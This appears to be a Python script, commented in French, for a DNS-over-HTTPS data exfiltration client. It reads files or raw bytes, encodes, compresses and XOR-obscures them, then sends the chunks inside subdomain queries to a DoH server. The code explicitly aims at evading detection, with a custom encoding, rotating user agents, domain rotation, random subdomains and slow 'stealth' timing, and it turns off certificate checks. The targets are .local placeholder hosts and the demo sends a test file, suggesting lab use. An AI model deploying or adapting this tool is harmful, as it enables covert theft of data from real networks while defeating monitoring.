#!/usr/bin/env python3
"""
DoH Exfiltration Client

Client sophistique pour l'exfiltration de donnees via DNS-over-HTTPS
avec parametres configurables et techniques d'evasion.
"""

import base64
import requests
import time
import random
import string
import hashlib
import json
import os
from typing import List, Dict, Any, Optional
from dataclasses import dataclass
from enum import Enum

class EncodingType(Enum):
    BASE64 = "base64"
    HEX = "hex"
    BASE32 = "base32"
    CUSTOM = "custom"

class TimingPattern(Enum):
    REGULAR = "regular"
    RANDOM = "random"
    BURST = "burst"
    STEALTH = "stealth"

@dataclass
class ExfiltrationConfig:
    """Configuration pour l'exfiltration DoH"""
    # Parametres de base
    doh_server: str = "https://doh.local/dns-query"
    target_domain: str = "exfill.local"
    chunk_size: int = 30
    
    # Parametres d'encodage
    encoding: EncodingType = EncodingType.BASE64
    compression: bool = False
    encryption: bool = False
    encryption_key: Optional[str] = None
    
    # Parametres de timing
    timing_pattern: TimingPattern = TimingPattern.REGULAR
    base_delay: float = 0.2
    delay_variance: float = 0.1
    burst_size: int = 5
    burst_delay: float = 2.0
    
    # Parametres d'evasion
    domain_rotation: bool = False
    backup_domains: List[str] = None
    subdomain_randomization: bool = True
    padding: bool = False
    padding_size: int = 10
    
    # Parametres de robustesse
    max_retries: int = 3
    retry_delay: float = 1.0
    timeout: float = 5.0
    
    def __post_init__(self):
        if self.backup_domains is None:
            self.backup_domains = []

class DoHExfiltrationClient:
    """Client d'exfiltration DoH avec parametres configurables"""
    
    def __init__(self, config: ExfiltrationConfig):
        self.config = config
        self.session = requests.Session()
        # Désactiver la vérification SSL pour les certificats auto-signés
        self.session.verify = False
        # Supprimer les warnings SSL
        import urllib3
        urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
        self.current_domain_index = 0
        self.stats = {
            'total_chunks': 0,
            'successful_chunks': 0,
            'failed_chunks': 0,
            'retries': 0,
            'total_bytes': 0,
            'start_time': None,
            'end_time': None
        }
        
    def exfiltrate_file(self, file_path: str, session_id: Optional[str] = None) -> bool:
        """
        Exfiltre un fichier via DoH
        
        Args:
            file_path: Chemin vers le fichier a exfiltrer
            session_id: ID de session optionnel pour identifier l'exfiltration
            
        Returns:
            bool: True si l'exfiltration reussit, False sinon
        """
        try:
            print(f"🚀 Starting DoH exfiltration: {file_path}")
            print(f"📊 Configuration: {self._config_summary()}")
            
            # Initialiser les statistiques
            self.stats['start_time'] = time.time()
            
            # Generer un ID de session si non fourni
            if not session_id:
                session_id = self._generate_session_id()
            
            # Lire et preparer les donnees
            data = self._read_file(file_path)
            if not data:
                return False
            
            # Preparer les donnees (encodage, compression, chiffrement)
            prepared_data = self._prepare_data(data)
            
            # Diviser en chunks
            chunks = self._split_into_chunks(prepared_data)
            self.stats['total_chunks'] = len(chunks)
            self.stats['total_bytes'] = len(data)
            
            print(f"📦 File size: {len(data)} bytes")
            print(f"🔀 Prepared data size: {len(prepared_data)} bytes")
            print(f"📋 Total chunks: {len(chunks)}")
            
            # Envoyer les chunks
            success = self._send_chunks(chunks, session_id)
            
            # Finaliser les statistiques
            self.stats['end_time'] = time.time()
            self._print_final_stats()
            
            return success
            
        except Exception as e:
            print(f"❌ Exfiltration failed: {e}")
            return False
    
    def exfiltrate_data(self, data: bytes, data_name: str = "data", session_id: Optional[str] = None) -> bool:
        """
        Exfiltre des donnees brutes via DoH
        
        Args:
            data: Donnees a exfiltrer
            data_name: Nom pour identifier les donnees
            session_id: ID de session optionnel
            
        Returns:
            bool: True si l'exfiltration reussit, False sinon
        """
        try:
            print(f"🚀 Starting DoH data exfiltration: {data_name}")
            print(f"📊 Configuration: {self._config_summary()}")
            
            self.stats['start_time'] = time.time()
            
            if not session_id:
                session_id = self._generate_session_id()
            
            # Preparer les donnees
            prepared_data = self._prepare_data(data)
            chunks = self._split_into_chunks(prepared_data)
            
            self.stats['total_chunks'] = len(chunks)
            self.stats['total_bytes'] = len(data)
            
            print(f"📦 Data size: {len(data)} bytes")
            print(f"🔀 Prepared data size: {len(prepared_data)} bytes")
            print(f"📋 Total chunks: {len(chunks)}")
            
            success = self._send_chunks(chunks, session_id)
            
            self.stats['end_time'] = time.time()
            self._print_final_stats()
            
            return success
            
        except Exception as e:
            print(f"❌ Data exfiltration failed: {e}")
            return False
    
    def _read_file(self, file_path: str) -> Optional[bytes]:
        """Lit un fichier et retourne son contenu en bytes"""
        try:
            with open(file_path, 'rb') as f:
                return f.read()
        except Exception as e:
            print(f"❌ Failed to read file {file_path}: {e}")
            return None
    
    def _prepare_data(self, data: bytes) -> str:
        """Prepare les donnees pour l'exfiltration (encodage, compression, chiffrement)"""
        prepared = data
        
        # Compression (si activee)
        if self.config.compression:
            import gzip
            prepared = gzip.compress(prepared)
            print(f"🗜️  Compressed: {len(data)} -> {len(prepared)} bytes")
        
        # Chiffrement (si active)
        if self.config.encryption and self.config.encryption_key:
            prepared = self._encrypt_data(prepared)
            print(f"🔐 Encrypted data")
        
        # Encodage
        if self.config.encoding == EncodingType.BASE64:
            encoded = base64.urlsafe_b64encode(prepared).decode('ascii')
        elif self.config.encoding == EncodingType.HEX:
            encoded = prepared.hex()
        elif self.config.encoding == EncodingType.BASE32:
            encoded = base64.b32encode(prepared).decode('ascii')
        elif self.config.encoding == EncodingType.CUSTOM:
            encoded = self._custom_encode(prepared)
        else:
            encoded = base64.urlsafe_b64encode(prepared).decode('ascii')
        
        print(f"🔢 Encoded with {self.config.encoding.value}: {len(encoded)} chars")
        return encoded
    
    def _encrypt_data(self, data: bytes) -> bytes:
        """Chiffre les donnees avec AES (simple XOR pour demo)"""
        # Simple XOR pour la demo - utiliser AES en production
        key = self.config.encryption_key.encode()[:32].ljust(32, b'\x00')
        encrypted = bytearray()
        for i, byte in enumerate(data):
            encrypted.append(byte ^ key[i % len(key)])
        return bytes(encrypted)
    
    def _custom_encode(self, data: bytes) -> str:
        """Encodage personnalise pour l'evasion"""
        # Encodage base64 modifie pour eviter la detection
        encoded = base64.urlsafe_b64encode(data).decode('ascii')
        # Remplacer certains caracteres
        custom_map = str.maketrans('+=/', 'xyz')
        return encoded.translate(custom_map)
    
    def _split_into_chunks(self, data: str) -> List[str]:
        """Divise les donnees en chunks de taille configuree"""
        chunks = []
        chunk_size = self.config.chunk_size
        
        for i in range(0, len(data), chunk_size):
            chunk = data[i:i + chunk_size]
            
            # Padding si active
            if self.config.padding and len(chunk) < chunk_size:
                padding_chars = ''.join(random.choices(string.ascii_lowercase, k=self.config.padding_size))
                chunk += padding_chars[:chunk_size - len(chunk)]
            
            chunks.append(chunk)
        
        return chunks
    
    def _send_chunks(self, chunks: List[str], session_id: str) -> bool:
        """Envoie tous les chunks via DoH"""
        print(f"\n📡 Starting chunk transmission...")
        print(f"🆔 Session ID: {session_id}")
        
        all_success = True
        
        for i, chunk in enumerate(chunks):
            success = self._send_single_chunk(chunk, i, len(chunks), session_id)
            
            if success:
                self.stats['successful_chunks'] += 1
            else:
                self.stats['failed_chunks'] += 1
                all_success = False
            
            # Appliquer le pattern de timing
            if i < len(chunks) - 1:  # Pas de delai apres le dernier chunk
                self._apply_timing_delay(i)
        
        success_rate = (self.stats['successful_chunks'] / self.stats['total_chunks']) * 100
        print(f"\n📊 Transmission complete: {success_rate:.1f}% success rate")
        
        return all_success
    
    def _send_single_chunk(self, chunk: str, index: int, total: int, session_id: str) -> bool:
        """Envoie un chunk individuel avec retry logic"""
        for attempt in range(self.config.max_retries + 1):
            try:
                # Construire le sous-domaine
                subdomain = self._build_subdomain(chunk, index, total, session_id)
                
                # Selectionner le domaine (rotation si activee)
                domain = self._get_current_domain()
                full_domain = f"{subdomain}.{domain}"
                
                # Preparer la requete DoH
                params = {
                    "name": full_domain,
                    "type": "A"
                }
                headers = {
                    "accept": "application/dns-json",
                    "user-agent": self._get_random_user_agent()
                }
                
                # Envoyer la requete
                response = self.session.get(
                    self.config.doh_server,
                    params=params,
                    headers=headers,
                    timeout=self.config.timeout
                )
                
                if response.status_code == 200:
                    print(f"✅ [{index+1:3d}/{total}] Sent chunk: {subdomain[:50]}...")
                    return True
                else:
                    print(f"⚠️  [{index+1:3d}/{total}] HTTP {response.status_code}: {subdomain[:30]}...")
                    
            except Exception as e:
                print(f"❌ [{index+1:3d}/{total}] Attempt {attempt+1} failed: {e}")
                
                if attempt < self.config.max_retries:
                    time.sleep(self.config.retry_delay)
                    self.stats['retries'] += 1
        
        print(f"💥 [{index+1:3d}/{total}] All attempts failed for chunk")
        return False
    
    def _build_subdomain(self, chunk: str, index: int, total: int, session_id: str) -> str:
        """Construit le sous-domaine pour un chunk"""
        # Format: [session_id]-[index]-[total]-[chunk].[random]
        base = f"{session_id[:8]}-{index:04d}-{total:04d}-{chunk}"
        
        # Ajouter randomisation si activee
        if self.config.subdomain_randomization:
            random_suffix = ''.join(random.choices(string.ascii_lowercase + string.digits, k=6))
            base += f".{random_suffix}"
        
        return base
    
    def _get_current_domain(self) -> str:
        """Retourne le domaine actuel (avec rotation si activee)"""
        if not self.config.domain_rotation or not self.config.backup_domains:
            return self.config.target_domain
        
        # Rotation des domaines
        all_domains = [self.config.target_domain] + self.config.backup_domains
        domain = all_domains[self.current_domain_index % len(all_domains)]
        self.current_domain_index += 1
        
        return domain
    
    def _get_random_user_agent(self) -> str:
        """Retourne un User-Agent aleatoire pour l'evasion"""
        user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101"
        ]
        return random.choice(user_agents)
    
    def _apply_timing_delay(self, chunk_index: int):
        """Applique le delai selon le pattern de timing configure"""
        if self.config.timing_pattern == TimingPattern.REGULAR:
            time.sleep(self.config.base_delay)
            
        elif self.config.timing_pattern == TimingPattern.RANDOM:
            delay = self.config.base_delay + random.uniform(-self.config.delay_variance, self.config.delay_variance)
            delay = max(0.01, delay)  # Minimum 10ms
            time.sleep(delay)
            
        elif self.config.timing_pattern == TimingPattern.BURST:
            if (chunk_index + 1) % self.config.burst_size == 0:
                time.sleep(self.config.burst_delay)
            else:
                time.sleep(0.01)  # Tres rapide dans le burst
                
        elif self.config.timing_pattern == TimingPattern.STEALTH:
            # Delai long et variable pour etre discret
            delay = random.uniform(self.config.base_delay * 2, self.config.base_delay * 5)
            time.sleep(delay)
    
    def _generate_session_id(self) -> str:
        """Genere un ID de session unique"""
        timestamp = str(int(time.time()))
        random_part = ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))
        return f"{timestamp}_{random_part}"
    
    def _config_summary(self) -> str:
        """Retourne un resume de la configuration"""
        return (f"Server: {self.config.doh_server}, "
                f"Chunk: {self.config.chunk_size}, "
                f"Encoding: {self.config.encoding.value}, "
                f"Timing: {self.config.timing_pattern.value}")
    
    def _print_final_stats(self):
        """Affiche les statistiques finales"""
        duration = self.stats['end_time'] - self.stats['start_time']
        throughput = self.stats['total_bytes'] / duration if duration > 0 else 0
        
        print(f"\n📈 EXFILTRATION STATISTICS:")
        print(f"   ⏱️  Duration: {duration:.2f} seconds")
        print(f"   📦 Total chunks: {self.stats['total_chunks']}")
        print(f"   ✅ Successful: {self.stats['successful_chunks']}")
        print(f"   ❌ Failed: {self.stats['failed_chunks']}")
        print(f"   🔄 Retries: {self.stats['retries']}")
        print(f"   📊 Success rate: {(self.stats['successful_chunks']/self.stats['total_chunks']*100):.1f}%")
        print(f"   🚀 Throughput: {throughput:.2f} bytes/sec")
        print(f"   📈 Total bytes: {self.stats['total_bytes']}")

def create_default_config() -> ExfiltrationConfig:
    """Cree une configuration par defaut"""
    return ExfiltrationConfig(
        doh_server="https://doh.local/dns-query",
        target_domain="exfill.local",
        chunk_size=30,
        encoding=EncodingType.BASE64,
        timing_pattern=TimingPattern.REGULAR,
        base_delay=0.2
    )

def create_stealth_config() -> ExfiltrationConfig:
    """Cree une configuration furtive"""
    return ExfiltrationConfig(
        doh_server="https://doh.local/dns-query",
        target_domain="exfill.local",
        chunk_size=20,  # Plus petits chunks
        encoding=EncodingType.CUSTOM,
        timing_pattern=TimingPattern.STEALTH,
        base_delay=2.0,  # Plus lent
        compression=True,
        subdomain_randomization=True,
        padding=True
    )

def create_fast_config() -> ExfiltrationConfig:
    """Cree une configuration rapide"""
    return ExfiltrationConfig(
        doh_server="https://doh.local/dns-query",
        target_domain="exfill.local",
        chunk_size=50,  # Plus gros chunks
        encoding=EncodingType.BASE64,
        timing_pattern=TimingPattern.BURST,
        base_delay=0.05,  # Tres rapide
        burst_size=10,
        burst_delay=1.0
    )

def main():
    """Fonction principale de demonstration"""
    print("🔐 DoH Exfiltration Client")
    print("=" * 50)
    
    # Creer un fichier de test
    test_file = "secret.txt"
    if not os.path.exists(test_file):
        with open(test_file, 'w') as f:
            f.write("This is secret data for DoH exfiltration testing!\n")
            f.write("Multi-line content to test chunking...\n")
            f.write("🔥 Advanced DoH exfiltration techniques\n")
        print(f"📄 Created test file: {test_file}")
    
    # Configuration par defaut
    print("\n1️⃣  Test with default configuration:")
    config = create_default_config()
    client = DoHExfiltrationClient(config)
    client.exfiltrate_file(test_file)
    
    print("\n" + "="*50)
    
    # Configuration furtive
    print("\n2️⃣  Test with stealth configuration:")
    stealth_config = create_stealth_config()
    stealth_client = DoHExfiltrationClient(stealth_config)
    stealth_client.exfiltrate_file(test_file)
    
    print("\n" + "="*50)
    
    # Test d'exfiltration de donnees brutes
    print("\n3️⃣  Test with raw data:")
    test_data = b"Raw binary data for testing: \x00\x01\x02\x03\xFF"
    fast_config = create_fast_config()
    fast_client = DoHExfiltrationClient(fast_config)
    fast_client.exfiltrate_data(test_data, "binary_test")

if __name__ == "__main__":
    main()
